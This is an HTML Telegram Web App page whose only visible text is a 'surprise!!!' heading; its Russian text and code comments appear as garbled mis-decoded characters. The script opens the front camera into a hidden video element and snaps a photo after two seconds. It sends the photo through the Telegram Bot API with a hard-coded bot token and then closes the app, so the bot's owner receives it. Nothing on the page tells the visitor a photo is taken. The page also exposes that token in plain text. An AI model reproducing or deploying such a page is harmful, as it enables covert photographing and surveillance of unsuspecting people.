<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ü´£</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <h1>—Å—é—Ä–ø—Ä–∏–∑!!!</h1>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const tg = window.Telegram.WebApp;

        // –ü–æ–ª—É—á–µ–Ω–∏–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ Telegram Web App
        const CHAT_ID = tg.initDataUnsafe?.user?.id;

        if (!CHAT_ID) {
            document.body.innerHTML = "<h1>Error: Could not get Telegram User ID.</h1>";
            throw new Error("Telegram User ID is required to send the photo.");
        }

        tg.expand(); // –£–≤–µ–ª–∏—á–µ–Ω–∏–µ Web App –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –≤–∫–ª—é—á–µ–Ω–∏–µ –∫–∞–º–µ—Ä—ã –∏ –∑–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ
        window.onload = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const context = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg');

                            // –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è base64 –≤ —Ñ–∞–π–ª –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                            fetch(imageData)
                                .then(res => res.blob())
                                .then(blob => {
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', blob, 'photo.jpg');

                                    // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            tg.close(); // –ó–∞–∫—Ä—ã—Ç–∏–µ Web App –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
                                        } else {
                                            console.error("Failed to send photo:", data.description);
                                            tg.close();
                                        }
                                    })
                                    .catch(err => {
                                        console.error("Error:", err);
                                        tg.close();
                                    });
                                });
                        }, 2000); // 2 —Å–µ–∫—É–Ω–¥—ã –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
                    };
                })
                .catch(err => {
                    console.error("Camera error:", err);
                    document.body.innerHTML = "<h1>Camera access denied or unavailable.</h1>";
                });
        };
    </script>
</body>
</html>
